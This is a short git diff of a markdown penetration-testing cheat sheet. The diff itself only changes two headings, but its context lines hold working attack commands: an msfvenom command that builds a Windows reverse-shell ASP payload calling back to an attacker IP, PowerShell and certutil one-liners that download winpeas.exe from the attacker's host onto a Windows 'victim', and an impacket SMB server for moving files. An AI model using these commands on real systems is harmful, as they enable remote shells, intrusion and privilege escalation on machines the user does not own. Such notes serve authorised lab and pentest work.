@@ -14,11 +14,11 @@
 1. `msfvenom -p windows/shell_reverse_tcp LHOST=myIP LPORT=1234 -f asp -o reverse.asp` 
 
 ## File Transfer to Window victim
-# File transfer via own web server
+### File transfer via own web server
 0. `python3 -m http.server 8080` from linux
 1. `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://myIP:80/winpeas.exe', 'winpeas.exe') -exec bypass` from window
 2. `certutil.exe -urlcache -f  http://myIp:80/winpeas.exe` from window
-# File Transfer via SMB
+### File Transfer via SMB
 0. `mkdir share` and move files to transfer
 1. `impacket-smbserver smb share/ ` from linux
 2. `net use \\myIP\smb` from window
